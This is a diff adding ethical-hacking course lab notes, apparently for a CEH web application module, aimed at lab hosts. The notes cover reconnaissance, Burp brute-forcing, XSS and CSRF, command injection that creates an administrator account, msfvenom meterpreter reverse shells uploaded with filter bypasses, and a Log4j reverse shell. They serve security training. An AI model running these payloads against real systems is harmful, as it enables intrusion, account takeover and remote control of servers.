@@ -1,0 +1,605 @@
+Module 14: Hacking Web Applications
+
+
+PS: A web application is a software application running on a web browser that allows a web user to submit data to and retrieve it from a database over the Internet or within an intranet.
+
+PS: Web application hacking is the exploitation of applications via HTTP by manipulating the application logics via an application’s graphical web interface, tampering with the uniform resource identifier (URI) or HTTP elements not contained in the URI.
+
+PS: Methods for hacking web applications, including SQL injection attacks, cross-site scripting (XSS), cross-site request forgeries (CSRF), and insecure communications.
+
+PS: Web applications run on web browsers and use a group of server-side scripts (such as ASP and PHP) and client-side scripts (such as HTML and JavaScript) to execute the application. 
+
+
+
+1. Footprint the web infrastructure
+
+
+a. Perform web application reconnaissance using Nmap (server port status) and Telnet (server technology)  (Use web address discover host machine details)
+
+Whois and domain registration info: netcraft.com, tamos.com, whois.domaintools.com, sabsoft.com
+
+DNS details: DNSRecon (github), network-tools.com, centralops.net
+
+$ nmap -T4 -A -v www.moviescope.com   (open ports and services running on the machine hosting the target website)
+
+$ telnet www.moviescope.com 80 
+> GET / HTTP/1.0         (banner grabbing: Make, model and version of target web server software. X-Powered-By = The Technology).
+
+NB:  If the attacker entered an IP address, they receive the banner information of the target machine; if they enter the URL of a website, they receive the banner information of the respective web server that hosts the website.
+
+
+
+
+
+b. Perform web application reconnaissance using WhatWeb
+
+$ whatweb   (display available commands)
+$ whatweb www.moviescope.com (Show Status, server, technology, author, title, passwordField, etc)
+$ whatweb -v www.moviescope.com (-v = verbose. Includes Country, HTTP Header, etc)
+$ whatweb --log-verbose=MovieScope_Report www.moviescope.com  (Output report "MovieScope_Report" and save in the root directory). 
+$ pluma MovieScope_Report    (Open and view report)
+
+
+
+
+
+c. Perform web spidering using OWASP ZAP  (Find SQL Injection vuln and the script)
+
+PS: OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. 
+
+Step 1: Launch OWASP ZAP
+
+$ zaproxy
+No, I don't want to persist... -> Start
+
+Step 2: Perform Scan of a Website
+
+Quick Start -> Automated Scan -> URL to attack: http://www.moviescope.com -> Use ajax spider: Firefox Headless -> Attack
+
+Step 3: View Results
+
+Alerts
+Spider (URL, Messages)
+
+
+
+
+
+d. Detect load balancers using various tools
+
+PS: Generally, there are two types of load balancers, namely, DNS load balancers (Layer 4 load balancers) and http load balancers (layer 7 load balancers).
+
+PS: You can use various tools such as dig and load balancing detector (lbd) to detect the load balancers of the target organization along with their real IP addresses.
+
+Step 1: Detect available Load Balancer using dig
+
+$ dig yahoo.com
+
+Step 2: Detect DNS and HTTP Load Balancers using Load Balancer Detector (lbd)
+
+$ lbd yahoo.com 
+
+
+
+
+e. Identify web server directories using various tools  (nmap, gobuster and dirsearch)
+
+Step 1: Enumerate Web Server Directories using nmap
+
+$ nmap -sV --script=http-enum www.moviescope.com
+
+Step 2: Perform Directory Brute-Force using Gobuster tool
+
+Places -> Desktop -> CEHv12 Module 14... -> common.txt -> paste on Desktop
+
+$ gobuster dir -u www.moviescope.com -w /home/attacker/Desktop/common.txt   (-u = url, -w = wordlists)
+
+Step 3: Directory brute-force using dirsearch
+
+$ cd dirsearch/
+$ python3 dirsearch.py -u http://www.moviescope.com  (directory brute-force)
+$ python3 dirsearch.py -u http://www.moviescope.com -e aspx  (list all files containing aspx file extension)
+$ python3 dirsearch.py -u http://www.moviescope.com -x 403  (directory brute-force excluding the status code 403)
+
+
+
+
+
+f. Perform web application vulnerability scanning using Vega  (List vulns and the quantity of each found)
+
+PS: Vega is a web application scanner used to test the security of web applications. It helps you to find and validate SQL Injection, XSS, inadvertently disclosed sensitive information, and other vulnerabilities.
+
+Step 1: Launch Wamp Server on .22
+
+Step 2: Launch Vega on .11
+
+Start -> Vega -> Run as Administrator
+Scan -> Start New Scan -> Enter a base URI for Scan: http://10.10.1.22:8080/dvwa -> Next -> Double-click to select (Injection Modules and Response Processing Modules) -> Next -> Authentication Options (Leave default) -> Parameters:check "Exclude listed parameters..." ->  Finish -> Yes
+
+Step 3: Analyze Result
+
+Unders Scan Alerts:Expand the nodes to view results 
+
+
+
+
+
+g. Identify clickjacking vulnerability using ClickjackPoc
+
+
+PS: Clickjacking, also known as a “UI redress attack,” occurs when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they intend to click on the top-level page. Thus, the attacker is “hijacking” clicks meant for the top-level page and routing them to another page, most likely owned by another application, domain, or both.
+
+Step 1: Create a txt File with containing the URL you want to scan
+
+$ cd ClickjackPoc
+$ echo "http://www.moviescope.com" | tee domain.txt    (Create domain.txt file containing target url)
+
+Step 2: Perform Clickjack Scan
+
+$ python3 clickJackPoc.py -f domain.txt
+
+Step 3: Analyze the Result
+
+Places -> Home -> Attacker -> ClickjackPoc -> right-click www.moviescope.com.html -> Open with -> Firefox
+
+
+
+
+
+
+
+2. Perform web application attacks
+
+
+
+a. Perform a brute-force attack using Burp Suite
+
+Step 1: Launch Wamp Server and Remote Login
+
+On .22: Launch Wamp Server
+on .13: http://10.10.1.22:8080/CEH/wp-login.php?   (Mozila Firefox)
+
+Step 2: Configure a Proxy on the Browser
+
+Open menu -> Preferences -> General -> Search: Proxy -> Settings -> Manual proxy configuration -> HTTP Proxy: 127.0.0.1 -> Port:8080 -> Also use this proxy for FTP and HTTPS: Check -> Ok -> Close preferences tab -> Minimize browser
+
+Step 3: Launch and Configure Burp Suite
+
+Applications -> Pentesting -> Web Application Analysis -> Web Application Proxies -> burpsuite -> Password:toor -> Ok -> Ok -> I Accept
+Temporary project: Check -> Next -> Use Burp defaults: Check -> Start Burp
+
+Step 4: Turn On Intercept Proxy
+
+Proxy -> Intercept: Turn on
+Switch back to Web browser -> Type random credentials -> username: admin -> Pawword: password -> Login
+Switch back to Burp Suite window. Observe that the HTTP request was intercepted.
+
+Step 5: Set the Brute-Force Payloads using Wordlists
+
+Right-click anywhere on the HTTP request window -> Send to Intruder -> Intruder -> Target (Observe Host and Port are correct) -> Positions (observe Burp Suite sets the target positions automatically)
+Clear $ (clear default payload values)
+Attack type -> Cluster bomb
+Select/highlight username -> Add $
+Select/highlight password -> Add $
+
+Payloads -> Payload set: 1 -> Payload type: Simple list -> Payload options: {Load - /home/attacker/Desktop/CEH../Wordlist/username.txt -> Open
+Payloads -> Payload set: 2 -> Payload type: Simple list -> Payload options: {Load - /home/attacker/Desktop/CEH../Wordlist/passwords.txt -> Open
+
+Start attack -> Ok
+
+Step 6: Note the Matching Usernames and Password and Remove Proxy Settings
+
+Observe the different values of Status and Length (corresponding to credentials combination) in the Raw tab (Under Request) (the right credential has HTTP status 302)
+Close the "Intruder attack of 10.10.1.22" 
+Proxy -> Intercept is on (switch off) -> 
+Switch to browser window -> Open menu -> preferences -> General -> Proxy -> Settings -> No proxy -> Ok -> Close
+
+Step 7: Login to Wordpress site with Obtained Credentials
+
+Browser -> http://10.10.1.22:8080/CEH/wp-login.php? -> Enter credentials
+
+
+
+
+b. Perform parameter tampering using Burp Suite
+
+PS: A web parameter tampering attack involves the manipulation of parameters exchanged between the client and server to modify application data such as user credentials and permissions, price, and quantity of products.
+
+Step 1: Launch the Victim Site and Setup Proxy Browser
+
+Launch Firefox -> http://www.moviescope.com 
+Menu -> Preferences -> Search: Proxy -> Settings -> Manual Proxy Configuration (HTTP Proxy: 127.0.0.1, Port: 8080, Also use this..: Check) -> Ok -> Close Preferences tab - minimize browser
+
+Step 2: Launch and configure Burp Suite
+
+Application -> Pentesting -> Web Application Analysis -> Web Application Proxies -> burpsuite -> Ok
+Temporary project -> Next -> Use Burp defaults -> Start Burp
+
+Step 3: Configure Interception and Intercept HTTP Requests
+
+Proxy -> Intercept is on 
+Open moviescope.com browser -> Username: sam, Password: test -> Login
+Open Burp Suite (Observe request is captured) -> Keep clicking Forward button until you are logged in to user account
+Open browser and see you are logged in -> View Profile 
+
+Step 4: Change the Logged-in User ID from 1 to 2
+
+Open Burp Suite -> Keep clicking Forward button until you get the HTTP request -> Expand (in the INSPECTOR section) -> Query Parameters -> (Observe NAME and VALUE columns) -> Double-click "value" (or click arrow icon >) -> Change value from 1 to 2 -> Apply Changes -> Intercept is off 
+
+Step 5: View the User Account Associated to ID=2
+
+Switch back to moviescope.com -> user account is "john". (You can change to any user account by changing the ID
+
+Remove Proxy setting from browser
+
+
+
+
+
+c. Identify XSS vulnerabilities in web applications using PwnXSS
+
+$ sudo su
+$ cd PwnXSS
+$ python3 pwnxss.py -u http://testphp.vulnweb.com
+
+Copy any (GET) link under Detected XSS section
+Open Firefox -> Paste Link -> Enter 
+
+
+
+
+
+d. Exploit parameter tampering and XSS vulnerabilities in web applications
+
+PS: Parameter tampering is a simple form of attack aimed directly at an application’s business logic. A parameter tampering attack exploits vulnerabilities in integrity and logic validation mechanisms that may result in XSS or SQL injection exploitation.
+
+Step 1: Exploit Parameter Tampering Vulnerability
+
+Windows 11 -> Firefox -> www.moviescope.com -> steve/password -> Login -> View Profile -> Change id in address bar from 4 to 1 (You are directed to another user pfrofile).
+
+Step 2: Exploit XSS Vulnerability
+
+Contacts -> Name: Steve (or any random name) -> Comment: <script>alert("You are Hacked")</script> -> Submit -> Refresh contact pag
+Login to.19 -> Open Firefox -> www.moviescope.com -> sam/test (same username you posted the comment) -> Contacts. 
+
+
+
+
+
+e. Perform cross-site request forgery (CSRF) attack using WPScan (WordPress Scanner)
+
+Step 1: Launch WordPress Site and Login
+
+Wampserver64
+Launch Firefox -> http://10.10.1.22:8080/CEH/wp-login.php? -> admin/qwerty@123
+
+Step 2: Activate leenk.me Plugin and Enable Facebook
+
+Plugins -> Installed Plugins -> leenk.me: Activate -> Refresh page
+leenk.me -> Check: Facebook -> Post: Check -> Save Settings
+
+Step 3: Configure Facebook Settings (This Setting will be changed through CSRF)
+
+Facebook Settings -> Default Message: This is CEH lab. -> Default Link Name: CEH.com -> Default Caption: CEH Labs -> Save Settings
+
+Step 4: Generate WPScan API Token (.13 or your personal Machine)
+
+Firefox -> https://wpscan.com/register -> Enter Credentials -> I Agree..:Check -> Captcha:Check -> Register -> Login to your Email -> Open noreply@wpscan.com -> Confirm my account -> enter same Email/Password -> Login -> How it works -> Get started for free -> Copy API Token 
+
+Step 5: Enumerate Vulnerable Plugins in the WordPress Website (.13)
+
+$ wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp 
+plugins are identified by [+] symbol
+
+Step 6: Copy the CSRF Script that will be run by Victim and Paste in Shared Folder 
+
+Places -> Desktop -> Security_Script.html : Copy -> Place -> Network -> Ctr+L -> smb://10.10.1.11 -> Admin/Pa$$w0rd -> Connect -> CEH-Tools -> CEHv12 Module 14 .. -> Paste
+
+Step 7: Run the Script on Victim Machine (.22)
+
+Z:\CEHv12 Module 14.. -> Security_Script.html: Copy -> Paste in Desktop -> Right-click -> Open With -> Firefox (Same browser used in configuring plugin) -> Ok -> Obser that the Facebook Settings in leenk.me plugin has been changed by CSRF attack.
+
+
+
+
+
+f. Enumerate and hack a web application using WPScan and Metasploit  (with a Username and Password.txt File, find login pwd)
+
+Step 1: Enumerate Usernames in the WordPress Website using WPScan (.13)
+
+$ wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u  (--enumerate u = enumerate usernames)
+
+Step 2: Using Metasploit, Perform Dictionay attack to find their Password.
+
+$ service postgresql start   (Start Postgre SQL DB)
+$ msfconsole
+> use auxiliary/scanner/http/wordpress_login_enum     (load WordPress login enumeration module)
+> show options    (view available commands)
+> set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+> set RHOST 10.10.1.22
+> set RPORT 8080
+> set TARGETURI http://10.10.1.22:8080/CEH
+> set USERNAME admin
+> run 
+
+Step 3: Use the obtained Username and Password to login to Wordpress
+
+Firefox -> http://10.10.1.22:8080/CEH/wp-login.php -> admin/qwerty@123
+
+
+
+
+g. Exploit a remote command execution vulnerability to compromise a target web server (Login on Web App, get System details)
+
+PS: Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is extremely vulnerable. 
+
+PS: The main objective of DVWA is to aid security professionals in testing their skills and tools in a legal environment, to help web developers better understand the processes of securing web applications, and to aid teachers and students in teaching and learning web application security in a classroom environment.
+
+PS: In this task, we will perform command-line execution on a vulnerability found in DVWA. Here, you will learn how to extract information about a target machine, create a user account, assign administrative privileges to the created account, and use that account to log in to the target machine.
+
+Step 1: Login to the DVWA Website and Test Available Commands (.11)
+
+Firefox -> http://10.10.1.22:8080/dvwa/login.php -> gordonb/abc123 -> Login
+Command Injection -> Ping a device: Enter IP: 10.10.1.22 -> Submit (successful)
+| hostname -> Submit (Error:Invalid IP)
+
+Step 2: Lower the Security Level
+
+DVWA Security (its currently on impossible) -> Security Level: Low -> Submit
+
+Step 3: Execute many commands on the Lowered Security
+
+Command Injection
+| hostname   (view host name)
+| whoami
+| tasklist    (view running processes)
+| Taskkill /PID 3112 /F   (3112 is PID of Microsoft.ActiveDirectory, /F = forcfully terminat e process)
+| dir C:\   (View Directory structure of C)
+| net user    (View user accounts)
+| net user Test /Add   (Add new user Test)
+| net user Test  (View user account information of user Test. It has Local Group Membership)
+| net localgroup Administrators Test /Add   (Assign administrative privilege to user Test)
+
+Step 4: RDP to .22 using the Newly Created User Test
+
+
+
+
+
+
+h. Exploit a file upload vulnerability at different security levels of DVWA - Using Metasploit
+
+Launch Wamp Server (.22)
+
+Step 1: Exploit upload Vulnerability at Low Security Level
+
+Step 1a: Create and Save Payload (.13)
+
+$ cd
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f raw
+Copy the generated payload
+$ cd /home/attacker/Desktop
+$ pluma upload.php
+Paste and save the copied exploit
+
+Step 1b: Login, Lower the Security level and Upload the Payload
+
+Launch Firefox -> http://10.10.1.22:8080/dvwa/login.php -> admin/password
+DVWA Security -> Security Level:Low -> Submit -> 
+File Upload -> Browse -> Navigate to upload.php -> Open -> Upload
+
+Step 1c: Launch Metasploit Meterpreter Listener
+
+$ cd
+$ msfconsole
+> use exploit/multi/handler
+> set payload php/meterpreter/reverse_tcp
+> set LHOST 10.10.1.13
+> set LPORT 4444
+> run 
+
+Step 1d: Execute the Payload
+
+Launch Firefox -> http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php
+
+Observe that a Meterpreter Session has been established.
+> sysnfo 
+
+
+Step 2: Exploit Upload Vulnerability at Medium Security Level
+
+Step 2a: Create and Save a Payload
+
+$ cd
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=3333 -f raw
+Copy the raw payload
+$ cd /home/attacker/Desktop
+$ pluma medium.php.jpg
+Paste and save the copied payload
+
+Step 2b: Login to DVWA, Change security Level to Medium, and Half Upload the Payload
+
+Firefox -> http://10.10.1.22:8080/dvwa/login.php -> admin/password
+DVWA Security -> Security Level: Medium -> Submit
+File Upload -> Browse -> Navigate to medium.php.jpg -> Open 
+
+Step 2c: Use Burp Suite Intercept to Change the Payload Extension from .php.jpg to .php
+
+Configure proxy (HTTP Proxy = 127.0.0.1, Port = 8080)
+Luanch Burp Suite (Applications -> Pentesting -> Web Application Analysis -> Web Application Proxies -> burpsuite) -> Proxy -> Intercept On
+Switch to Browser -> Upload
+Switch to Burp Suite -> Change file name from medium.php.jpg to medium.php -> Forward 
+Turn Interception off
+Remove the proxy
+
+Step 2d: Launch a Metasploit Meterpreter Listener
+
+$ cd
+$ msfconsole
+> use exploit/multi/handler
+> set payload php/meterpreter/reverse-tcp
+> set LHOST 10.10.1.13
+> set LPORT 3333
+> run
+
+Step 2e: Execute the Payload
+
+Launch Firefox -> http://10.10.1.22:8080/dvwa/hackable/uploads/medium.php
+Meterpreter session is established
+> sysinfo
+
+
+Step 3: Exploit Upload Vulnerability at High Security Level
+
+Step 3a: Create and Save a Raw Payload
+
+$ cd
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=2222 -f raw
+Copy the raw payload
+$ cd /home/attacker/Desktop
+$ pluma high.jpeg
+Paste and save the raw payload
+
+Step 3b: Login to DVWA, Security level High, Upload the Payload
+
+Launch Firefox -> http://10.10.1.22:8080/dvwa/login.php -> admin/password
+DVWA security -> Security Level: High -> Submit 
+File Upload -> Browse -> Navigate to high.jpeg -> Open -> Upload
+
+Step 3c: Use Command Injection to Change the file extension from .jpeg to .php
+
+Command Injection -> |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php -> Submit
+
+Step 3d: Launch Meterpreter Listener
+
+$ cd
+$ msfconsole
+> use exploit/multi/handler
+> set payload php/meterpreter/reverse_tcp
+> set LHOST 10.10.1.13
+> set LPORT 2222
+> run
+
+Step 3e: Execute the Payload
+
+Launch Firefox -> http://10.10.1.22:8080/dvwa/hackable/uploads/shell.php 
+Meterpreter session is established
+> sysinfo
+
+
+
+
+i. Gain access by exploiting Log4j vulnerability
+
+Step 1: Install a Log4J Vulnerable Server in Docker Container (.9 = Ubuntu)
+
+$ sudo su
+$ sudo apt-get update
+$ sudo apt-get install docker.io    (install docker)
+$ cd log4j-shell-poc
+$ docker build -t log4j-shell-poc .   (Setup log4j vulnerable server. -t = specifies allocating a pseudo-tty)
+$ docker run --network host log4j-shell-poc   (Start the vulnerable Server)
+
+Step 2: Launch the server on Attacker machine (.13)
+
+Firefox -> http://10.10.1.9:8080
+
+Step 3: Install JDK 8
+
+Open a New Terminal
+$ sudo su
+$ tar -xf jdk-8u202-linux-x64.tar.gz    (Unzip/Extract the JDK file)
+$ mv jdk1.8.0_202 /usr/bin     (Move the extracted JDK file to /usr/bin directory)
+
+Step 4: Update the JDK Path in the poc.py file
+
+New Terminal
+$ sudo su
+$ cd log4j-shell-poc
+$ pluma poc.py
+In line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac
+In line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
+In line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
+Save -> Close
+
+Step 5: Initiate a Netcat Listener
+
+New Terminal
+$ nc -lvp 9001 
+
+Step 6: Create a Payload using the Updated poc.py File
+
+$ python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
+
+Step 7: Copy the Generated Payload and Login to the Vulnerable Server
+
+Copy the payload generated in the send me: section
+Open Firefox -> in the Open Vulnerable server -> Username: (Copied payload), Password: password -> Login
+
+Switch to netcat listener -> a reverse shell is opened
+>pwd
+> whoami
+> 
+
+
+
+
+
+
+3. Detect Web Application Vulnerabilities using Various Web Application Security Tools
+
+a. Detect web application vulnerabilities using N-Stalker Web Application Security Scanner
+
+PS: N-Stalker Web App Security Scanner checks for vulnerabilities such as SQL injection, XSS, and other known attacks. It is a useful security tool for developers, system/security administrators, IT auditors, and staff, as it incorporates the well-known “N-Stealth HTTP Security Scanner” and its database of 39,000 web attack signatures along with a component-oriented web application security assessment technology.
+
+Step 1: Install and Update N-Stalker (.19)
+
+Z:\..\Web Applica..\N-Stalker..\   double-click NStalker-WebSecurity-FreeX-b34.exe -> Finish
+Update (Update scanner)
+
+Step 2: Start a New Scanning Session
+
+Start -> Enter Web App URL: https://www.moviescope.com -> Choose Scan Policy: OWASP Scan Policy -> Next -> Next -> Start Session -> Start Scan 
+After Scan Complete -> Save Scan resulys -> Keep scan session for further analysis -> Next -> Done 
+
+Step 3: Analyse Result
+
+Expand all nodes and sub-nodes under http://www.moviescope.com 
+Expand URL under Vulnerabilities (View all site's vulnerabilities)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
